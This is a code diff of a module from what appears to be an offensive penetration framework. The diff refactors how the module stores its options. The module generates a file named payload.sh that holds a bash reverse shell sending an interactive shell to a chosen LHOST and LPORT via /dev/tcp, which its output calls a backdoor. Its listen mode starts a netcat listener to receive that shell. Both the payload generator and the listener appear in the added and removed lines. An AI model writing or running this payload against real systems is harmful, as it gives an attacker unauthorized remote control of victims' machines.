@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.sh"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.sh"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -32,15 +32,15 @@ def running():
             time.sleep(2)
             print ("")
             mark = '/'
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = '''
-bash -i >& /dev/tcp/'''+var.lhost[0]+mark+var.lport[0]+''' 0>&1
+bash -i >& /dev/tcp/'''+var.all_var['lhost']+mark+var.all_var['lport']+''' 0>&1
 '''
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "listen" or var.ltype[0] == "LISTEN":
-            os.system("nc -l -p "+str(var.lport[0])+" -v")
+        elif var.all_var['ltype'] == "listen" :
+            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
 
         else:
             print (red+"[-]"+default+"Choose LTYPE " )
